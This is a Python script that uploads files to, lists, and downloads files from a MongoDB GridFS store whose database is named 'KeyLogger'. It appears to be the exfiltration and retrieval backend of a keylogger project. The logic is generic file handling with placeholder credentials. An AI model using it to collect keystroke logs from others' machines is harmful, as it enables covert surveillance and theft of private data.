from pymongo import MongoClient
import gridfs
import os

def mongo_conn():
    try:
        CONNECTION_STRING = "Mongo_db_Connection_String"
        client = MongoClient(CONNECTION_STRING)
        print("Connection successful!")
        return client.KeyLogger  # KeyLogger will be the database name.
    except Exception as e:
        print(f"Error while connecting to MongoDB: {e}")

def Upload_file(file_name, file_path):
    db = mongo_conn()
    fs = gridfs.GridFS(db, collection="files")
    with open(file_path, 'rb') as file:
        data = file.read()

    # put file to the database
    fs.put(data, filename=file_name)
    print("Uploaded successfully.")

def list_files():
    """List all files stored in the database with their index."""
    db = mongo_conn()
    files = db.files.files.find()
    file_list = []
    for idx, file in enumerate(files):
        file_list.append((idx, file['filename']))
    return file_list

def download_file_by_index(index, download_loc):
    """Download a specific file by its index."""
    db = mongo_conn()
    fs = gridfs.GridFS(db, collection="files")
    
    # Retrieve all files in the order they were uploaded
    files = list(db.files.files.find())
    if index < 0 or index >= len(files):
        print("Invalid index! Please provide a valid file index.")
        return

    # Get file details by index
    file_data = files[index]
    file_name = file_data['filename']
    fs_id = file_data['_id']

    out_data = fs.get(fs_id).read()
    download_path = os.path.join(download_loc, file_name)

    with open(download_path, 'wb') as output:
        output.write(out_data)
    print(f"File '{file_name}' downloaded successfully to '{download_path}'.")


if __name__ == '__main__':
    # Example usage
    print("Listing available files:")
    files = list_files()
    for idx, name in files:
        print(f"[{idx}] {name}")

    # Specify index of file to download
    index_to_download = int(input("Enter the index of the file you want to download: "))
    download_location = "Location_Path"  # Adjust path as needed
    download_file_by_index(index_to_download, download_location)
